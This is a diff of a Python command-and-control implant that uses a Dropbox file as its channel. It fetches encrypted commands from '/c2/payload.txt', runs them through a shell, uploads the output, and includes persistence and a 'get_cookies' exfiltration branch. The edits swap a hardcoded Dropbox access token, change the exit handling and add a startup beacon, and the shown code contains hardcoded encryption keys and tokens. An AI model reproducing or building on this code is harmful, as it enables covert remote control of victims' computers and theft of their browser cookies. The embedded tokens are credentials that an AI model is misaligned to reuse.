@@ -150,7 +150,7 @@ def persistance():
 
 # Execute the command 
 def excecute(command):
-    print('[+] Successfully read command from Dropbox Server')
+    print('[+] Successfully read command from Dropbox file')
     print(f'command form c2->{command}')
     command = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     output = command.stdout.read() + command.stderr.read()
@@ -158,12 +158,12 @@ def excecute(command):
     print(f'output->{output}')
     write_output(output)
 
-# Write output back to the dropbox file
+# Write output to the dropbox file
 def write_output(output):
     prev_output = output
     output = encrypt_message(output)
     dbx.files_upload(output, dropbox_path, mode=dropbox.files.WriteMode("overwrite"))
-    print("[+] Response written to Dropbox Server")
+    print("[+] Response written to Dropbox file")
 
     check_new_command(prev_output)
 
@@ -181,7 +181,7 @@ def check_new_command(prev_output):
             time.sleep(n)
         
         elif new_command == 'exit':
-            break
+            exit(0)
 
         elif new_command == 'get_cookies':
             exfil()
@@ -198,11 +198,8 @@ if __name__ == '__main__':
     key = "564cybereffectss".encode()
     CONST_IV = 'qwertyuiopasdfgh'.encode()
 
-    # dropbox init
-    # with open("token.txt", "r") as f:
-    #     token = f.read()
-
-    token = "sl.BzeK72Mpf5vXSc_vEDUBjC-9597AgViP3MghTc71ych10QOWcG5oAgM2AiHa4UOiFyUFwzgx7OaLfRz0r4YTXVuHu1yTGiK_pdGZK5YRO5SagCv0qnKJodFury1npzFcG2-RycPCeJKfTUOuT8BP"
+    # Dropbox token
+    token = "sl.BzipikmzyjxCV7JGHNeWSt-Xpp5YZYLNLPT1HpJtB1k5pRFv00cTbS60O0rU7aasDlSNrv0l9KD1Pjd0DabePyrzYN2WCTNAgGqHJ5RwSGz7_b-08B5VbXf_ZSXRUcSoeWHvTs61plZ-M-zUwe4d"
 
     dbx = dropbox.Dropbox(token)
     dropbox_path = '/c2/payload.txt'
@@ -210,6 +207,7 @@ if __name__ == '__main__':
     prev_command = None
 
     # start payload execution
+    write_output(b"Client Started")
     _, response = dbx.files_download(dropbox_path)
     command = decrypt_message(response.content)
 
